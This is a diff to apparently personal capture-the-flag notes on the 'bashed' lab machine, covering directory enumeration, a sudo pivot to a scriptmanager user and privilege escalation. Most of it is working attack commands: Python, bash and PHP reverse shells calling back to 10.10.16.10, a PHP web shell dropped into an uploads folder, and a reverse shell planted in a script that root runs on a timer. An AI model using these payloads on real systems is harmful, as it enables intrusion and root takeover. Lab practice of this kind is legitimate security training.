@@ -55,7 +55,6 @@ gobuster dir -u http://bashed/php/ -w /usr/share/wordlists/dirb/common.txt -t 20
 
 # sudo bash -i >& /dev/tcp/10.10.16.10/80 0>&1 # bad char
 export RHOST="10.10.16.10";export RPORT=80;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
-
 ```
 
 ## interactive shell
@@ -79,10 +78,9 @@ sudo -l
 
 ```sh
 cd /tmp
-wget 10.10.16.10:8000/linux-local-enum.sh
-chmod u+x linux-local-enum.sh
-./linux-local-enum.sh
-  # Ubuntu 16.04.2
+# wget 10.10.16.10:8000/enum-LinEnum.sh
+# chmod u+x linux-local-enum.sh
+# ./enum-LinEnum.sh
 
 uploads/index.html
   # -rwxrwxrwx  1 root root   14 Dec  4  2017 index.html
@@ -91,12 +89,17 @@ cat << 'EOF' > index.php
 $sock=fsockopen("10.10.16.10",1337);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
 ?>
 EOF
-
+  # persistent... still www-data, but active on accessing the URL.
 ```
 
-+ TODO
-  - enum script
-  - cron job
+```sh
+sudo -u scriptmanager bash
+cd /scripts
+  # test.py which write test.txt as root every other minute
+cat << 'EOF' > test.py
+import sys,socket,os,pty;s=socket.socket();s.connect(("10.10.16.10",1338));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")
+EOF
+```
 
 ## msf
 
